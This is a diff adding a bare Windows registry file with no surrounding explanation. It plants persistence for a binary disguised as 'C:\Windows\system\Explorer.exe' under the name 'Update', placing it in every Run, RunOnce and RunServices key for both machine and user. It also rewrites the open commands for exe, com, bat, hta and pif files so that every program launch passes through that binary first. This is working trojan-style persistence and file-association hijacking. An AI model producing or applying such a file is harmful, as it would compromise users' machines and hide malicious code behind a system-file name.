@@ -1,0 +1,35 @@
+REGEDIT4
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
+"Update"="C:\Windows\system\Explorer.exe"
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce]
+"Update"="C:\Windows\system\Explorer.exe"
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices]
+"Update"="C:\Windows\system\Explorer.exe"
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]
+"Update"="C:\Windows\system\Explorer.exe"
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
+"Update"="C:\Windows\system\Explorer.exe"
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce]
+"Update"="C:\Windows\system\explorer.exe"
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices]
+"Update"="C:\Windows\system\Explorer.exe"
+[HKEY_CLASSES_ROOT\exefile\shell\open\command]
+"@"="c:\windows\system\Explorer.exe%1\ %*"
+[HKEY_CLASSES_ROOT\comfile\shell\open\command]
+"@"="c:\windows\system\Explorer.exe%1\ %*"
+[HKEY_CLASSES_ROOT\batfile\shell\open\command]
+"@"="c:\windows\system\Explorer.exe%1\ %*"
+[HKEY_CLASSES_ROOT\htafile\Shell\Open\Command]
+"@"="c:\windows\system\Explorer.exe%1\ %*"
+[HKEY_CLASSES_ROOT\piffile\shell\open\command]
+"@"="c:\windows\system\Explorer.exe%1\ %*"
+[HKEY_LOCAL_MACHINE\Software\CLASSES\batfile\shell\open\command]
+"@"="c:\windows\system\Explorer.exe%1\ %*"
+[HKEY_LOCAL_MACHINE\Software\CLASSES\comfile\shell\open\command]
+"@"="c:\windows\system\Explorer.exe%1\ %*"
+[HKEY_LOCAL_MACHINE\Software\CLASSES\exefile\shell\open\command]
+"@"="c:\windows\system\Explorer.exe%1\ %*"
+[HKEY_LOCAL_MACHINE\Software\CLASSES\htafile\Shell\Open\Command]
+"@"="c:\windows\system\Explorer.exe%1\ %*"
+[HKEY_LOCAL_MACHINE\Software\CLASSES\piffile\shell\open\command]
+"@"="c:\windows\system\Explorer.exe%1\ %*"
